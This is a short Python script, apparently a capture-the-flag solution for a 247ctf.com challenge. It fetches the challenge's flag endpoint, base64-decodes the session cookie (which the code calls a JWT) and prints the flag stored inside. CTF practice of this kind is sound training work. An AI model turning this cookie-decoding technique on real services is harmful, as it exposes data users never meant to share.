#/usr/bin/python3
import requests
import base64
import ast
import sys

if(len(sys.argv) < 2):
    print("python3 exploit.py instance_number")
    sys.exit()

url = f"https://{sys.argv[1]}.247ctf.com/flag?secret_key=5"

r = requests.get(url)
jwt_token = r.cookies.get_dict()["session"]
jwt_body = jwt_token.split(".")[0]

if len(jwt_body) % 4 != 0: #check if multiple of 4
    while len(jwt_body) % 4 != 0:
        jwt_body = jwt_body + "="
    body = base64.b64decode(jwt_body)
else:
    body = base64.b64decode(jwt_body)

body = body.decode()
body_dict = ast.literal_eval(body)
encoded_flag = body_dict["flag"][" b"]
flag = base64.b64decode(encoded_flag).decode()
print(flag)